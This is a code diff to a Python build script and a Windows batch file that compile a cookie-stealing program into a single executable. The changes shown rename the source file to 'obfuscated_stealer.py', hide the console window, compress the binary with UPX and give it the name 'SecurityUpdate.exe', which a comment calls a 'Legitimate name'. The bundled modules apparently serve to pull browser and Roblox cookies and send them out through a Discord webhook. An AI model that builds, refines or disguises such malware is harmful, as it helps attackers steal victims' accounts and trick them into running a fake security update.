@@ -31,7 +31,7 @@ def build_with_nuitka():
         'python', '-m', 'nuitka',
         '--standalone',              # Create standalone executable
         '--onefile',                 # Single file output
-        '--windows-console-mode=disable', # No console window
+        '--windows-disable-console', # No console window
         '--enable-plugin=upx',       # Enable UPX compression
         '--remove-output',           # Clean build files
         '--output-filename=SecurityUpdate.exe',  # Legitimate name
@@ -53,7 +53,11 @@ def build_with_nuitka():
         '--include-module=json',
         '--include-module=base64',
         
-        'CookieStealer.py'
+        # Performance optimizations
+        '--python-flag=O',           # Optimize bytecode
+        '--python-flag=-S',          # Don't import site module
+        
+        'obfuscated_stealer.py'
     ]
     
     print("Building with Nuitka (True compilation + obfuscation)...")
@@ -86,7 +90,7 @@ echo Installing Nuitka and dependencies...
 pip install nuitka ordered-set browser-cookie3 pycryptodome pywin32 discordwebhook httpx requests robloxpy
 
 echo Building with Nuitka (True Compilation)...
-python -m nuitka --standalone --onefile --windows-console-mode=disable --enable-plugin=upx --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --include-module=json --include-module=base64 CookieStealer.py
+python -m nuitka --standalone --onefile --windows-disable-console --enable-plugin=upx --remove-output --output-filename=SecurityUpdate.exe --windows-icon-from-ico=icon32.ico --include-module=win32crypt --include-module=Crypto.Cipher.AES --include-module=browser_cookie3 --include-module=discordwebhook --include-module=robloxpy --include-module=httpx --include-module=requests --include-module=sqlite3 --python-flag=O --python-flag=-S obfuscated_stealer.py
 
 echo Build complete! SecurityUpdate.exe is a TRUE compiled executable
 pause
